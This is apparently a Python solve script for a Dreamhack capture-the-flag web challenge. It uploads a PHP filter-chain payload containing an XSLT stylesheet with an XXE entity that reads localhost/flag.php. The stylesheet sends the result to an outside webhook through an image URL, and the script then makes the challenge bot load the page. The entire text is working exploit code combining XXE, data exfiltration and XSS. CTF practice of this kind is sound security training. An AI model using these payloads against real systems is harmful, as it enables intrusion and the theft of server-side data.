import requests
import base64
import re
from urllib.parse import quote

url = 'http://host3.dreamhack.games:9122/'
s = requests.Session()

def to_b64(s):
    return base64.b64encode(s.encode()).decode()

def build_payload(raw):
    b64 = to_b64(raw)

    body = f'''{len(b64):x}\r\n{b64}\r\n0\r\n\r\n'''

    return f'resource=data:,{quote(body)}|dechunk'

# xxe exfil
webhook = 'https://dfyzeml.request.dreamhack.games'

xsl = '''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY e SYSTEM "http://localhost:80/flag.php"> ]>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html><img><xsl:attribute name="src">%s/&e;</xsl:attribute></img></html>
</xsl:template>
</xsl:stylesheet>''' % webhook

payload = f'''<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:text/xml;base64,{to_b64(xsl)}"?><r/>'''.replace("\n", '')

res = s.post(f'{url}/upload.php', data={
    'name[name name': '',
    'filter_filter_filter': build_payload(payload)
})

assert 'success' in res.text
print("> Uploaded payload")

# get file path
res = s.get(f'{url}/list.php')

path = re.findall(r"(/files/.+)'>", res.text)[0].strip()
print("> Payload path:", path)

# xss
res = s.post(f'{url}/bot.php', data={
    'url': path
})

assert 'success' in res.text
print("> Reported payload")